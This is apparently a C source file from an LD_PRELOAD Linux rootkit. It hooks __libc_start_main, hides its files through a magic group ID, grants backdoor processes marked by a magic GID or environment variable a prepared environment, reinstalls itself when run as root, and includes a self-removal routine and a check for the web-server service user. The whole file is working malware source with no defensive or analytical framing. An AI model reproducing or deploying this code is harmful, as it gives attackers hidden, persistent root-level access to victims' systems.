#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <fnmatch.h>
#include <libgen.h>
#include <pwd.h>
#include <dlfcn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/netlink.h>

void killself(int mode);
int snodew(void);
int iswww(void);

#include "config.h"
#include "hooks.c"

void killself(int mode){
    if(geteuid() != 0){
        if(mode == KILLSELF_OUTPUT)
            printf("inadequate permissions\n");
        return;
    }

    getsym(o_unlink, "unlink");
    for(int i = 0; rkfiles[i] != NULL; i++){
        if(o_unlink(rkfiles[i]) < 0){
            if(mode == KILLSELF_OUTPUT)
                printf("something went wrong removing %s\n", rkfiles[i]);
        }else{
            if(mode == KILLSELF_OUTPUT)
                printf("successfully removed %s\n", rkfiles[i]);
        }
    }

#if defined(CLIENTPEM) && defined(SERVERCRT)
    char *const certpaths[3] = {CLIENTPEM, SERVERCRT, NULL};
    for(int i = 0; certpaths[i] != NULL; i++){
        if(o_unlink(certpaths[i]) < 0){
            if(mode == KILLSELF_OUTPUT)
                printf("something went wrong removing %s\n", certpaths[i]);
        }else{
            if(mode == KILLSELF_OUTPUT)
                printf("successfully removed %s\n", certpaths[i]);
        }
    }
#endif
}

static int snodewme = 0;
int snodew(void){
    if(snodewme != 0) return 1;
    if(getgid() == MAGIC_GID) snodewme = 1;
    if(getenv(MAGIC_VAR) != NULL) snodewme = 1;
    return snodewme;
}

int iswww(void){
    const char *name, *homedir;
    struct passwd *pw;
    uid_t myuid = getuid();
    gid_t mygid = getgid();
    int www = 0;

    if(myuid == WWWUID) www++;  /* i might just make this one condition... */
    if(mygid == WWWGID) www++;  /* instead of two seperate indications.    */

    pw = getpwuid(myuid);      /* get relevant information about the user */
    if(pw == NULL) return 0;   /* of the calling process. so we can check */
    name = pw->pw_name;        /* it is actually the service user.        */
    homedir = pw->pw_dir;

    if(name == NULL || homedir == NULL)
        return 0;   /* ???? */

    if(!strcmp(name, WWWNAME)) www++;
    //if(!strcmp(homedir, WWWHOME)) www++;

    char *homevar = getenv("HOME");                                  /* check that both the HOME variable & */
    if(homevar != NULL)                                              /* the pw entry for the user's homedir */
        if(!strcmp(homedir, WWWHOME) && !strcmp(homevar, WWWHOME))   /* match. */
            www++;

    char *myname = get_myname();
    for(int i = 0; service_names[i] != NULL; i++){   /* compare against possible   */
        if(strstr(myname, service_names[i])){        /* process names of services  */
            www++;
            break;
        }
    }
    free(myname);

    for(int i = 0; service_vars[i] != NULL; i++){  /* compare against environment */
        if(getenv(service_vars[i]) != NULL){       /* variables that could/should */
            www++;                                 /* be exported by the service  */
            break;
        }
    }

    /* return respectively if we have the required minimum
     * amount of successful indications. */
    if(www >= MINIMUM_IND) return 1;
    return 0;
}

int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    getsym(o_libc_start_main, "__libc_start_main");

    if(snodew()){  /* rootkit process/backdoor user. get it ready. */
        for(int i = 0; set_variables[i] != NULL; i++)
            putenv(set_variables[i]);
        for(int i = 0; unset_variables[i] != NULL; i++)
            unsetenv(unset_variables[i]);
    }

    if(geteuid() != 0)
        goto do_libc_start_main;

    struct stat pstat;
    int path_stat;
    getsym(o_xstat, "__xstat");

    for(int i = 0; rkfiles[i] != NULL; i++){                 /* if one file doesn't exist, they */
        memset(&pstat, 0, sizeof(struct stat));              /* all get removed...              */
        path_stat = o_xstat(_STAT_VER, rkfiles[i], &pstat);
        if(path_stat < 0 && errno == ENOENT){
            killself(KILLSELF_QUIET);
            goto do_libc_start_main;
        }

        if(path_stat){  /* file exists. make sure it's hidden still */
            getsym(o_chown, "chown");
            o_chown(rkfiles[i], 0, MAGIC_GID);
        }
    }

    reinstall();  /* don't try to reinstall if we don't
                   * have everthing that we should. */
do_libc_start_main:
    return o_libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}